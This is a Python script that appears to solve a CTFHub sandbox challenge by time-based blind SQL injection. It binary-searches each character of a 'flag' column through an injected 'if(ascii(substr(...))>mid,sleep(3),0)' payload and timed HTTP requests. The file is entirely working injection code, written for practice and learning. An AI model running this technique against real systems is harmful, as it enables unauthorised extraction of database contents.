import time
import requests

# https://blog.csdn.net/cxiaodi/article/details/124673403?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-124673403-blog-123314094.pc_relevant_aa2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-124673403-blog-123314094.pc_relevant_aa2&utm_relevant_index=4

url = "http://challenge-48f3ef933687971c.sandbox.ctfhub.com:10800/"

flag = ""
for i in range(1, 50):  # 遍历的字符总数
    left = 32  # 常用字符的ascii码范围
    right = 128
    # 布尔注入只能查看sql语句的true false,利用2分法，对比ascii码爆破每个字符
    while left < right:
        mid = (left + right) // 2
        # ascii返回左边第一个字符的ascii, substr函数用于截取对应字段指定长度
        payload = f"?id=1+and+if(ascii(substr((select flag from flag)%2C{i}%2C1))>{mid}%2Csleep(3)%2C0)"  # flag列的字段
        #if(ascii(substr((select flag from flag),i,1))>mid,sleep(3),0
        urls = url + payload
        begin = time.time()
        res = requests.get(urls)
        end = time.time()
        print(mid)
        #print(res.text)
        if end - begin > 2.9:
            left = mid + 1
        else:
            right = mid
    if left != 32:
        flag += chr(left)
    else:
        break
    print(flag)
